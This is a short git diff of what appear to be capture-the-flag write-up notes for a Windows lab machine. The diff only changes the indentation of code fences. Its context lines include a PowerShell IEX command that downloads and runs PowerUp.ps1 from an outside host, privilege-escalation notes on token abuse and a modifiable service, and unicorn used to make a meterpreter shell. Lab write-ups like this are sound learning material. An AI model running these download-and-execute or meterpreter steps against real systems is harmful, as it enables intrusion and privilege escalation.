@@ -257,7 +257,7 @@ cmd > powershell (Get-Content hm.txt -Stream root.txt)
 ```
 ## Alternate Privilege Escalation Method (Unintended, harder)
 - Upload PowerUp.ps1
-	```
+```
 IEX(New-Object Net.WebClient).downloadString("http://10.10.14.25:8001/PowerUp.ps1")
 Invoke-AllChecks
 
@@ -292,7 +292,7 @@ Check        : Unattended Install Files
 	- Modified Service File check : theres a service jenkins and we should be able to modify it and when it restarts, it starts our executable that we put in
 	- We check unattended path but theres nothing
 - Another command to check Privilege Names:
-	```
+```
 whoami /priv
 
 ---OUTPUT---
@@ -315,7 +315,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 	- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
 		- Shows vulnerable tokens we could privesc from
 	- We use unicorn to create a meterpreter shell:
-		```
+```
 cd /opt/unicorn
 sudo python unicorn.py
 cp password_attack.txt /...../Jeeves/www/msf.txt
